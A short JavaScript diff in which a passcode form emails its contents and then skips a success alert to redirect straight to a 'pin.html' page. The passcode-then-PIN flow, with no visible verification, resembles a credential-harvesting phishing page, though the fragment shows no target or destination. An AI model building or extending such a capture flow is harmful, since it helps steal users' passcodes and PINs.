@@ -55,10 +55,8 @@
         Body: messageBody
       }).then(message => {
         if (message === 'OK') {
-          swal("Success", "Passcode submitted successfully.", "success").then(() => {
-            window.location.href = 'next.html'; // Redirect to the next page
-          });
-        } else {
+        window.location.href = 'pin.html'; // Redirect to the next page
+      } else {
           swal("Error", "There was an issue submitting your passcode. Please try again.", "error");
         }
       });
